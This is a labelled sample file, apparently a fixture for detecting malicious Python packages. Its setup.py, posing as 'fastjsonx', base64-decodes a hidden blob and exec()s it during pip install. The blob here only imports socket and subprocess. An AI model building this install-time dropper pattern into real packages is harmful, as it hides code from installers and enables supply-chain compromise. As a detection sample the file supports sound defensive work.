name: pypi-setup-b64-exec-dropper
note: the canonical PyPI sdist dropper: setup.py runs during `pip install` and exec()s a base64-decoded blob. The installing user never sees the decoded code. This is the Python analog of an npm postinstall stage-2 loader.

sourceFiles.setup.py:
from setuptools import setup
import base64

_payload = base64.b64decode("aW1wb3J0IHNvY2tldCwgc3VicHJvY2Vzcwo=")
exec(_payload)

setup(
    name="fastjsonx",
    version="0.0.1",
    py_modules=["fastjsonx"],
    description="fast json helpers",
)
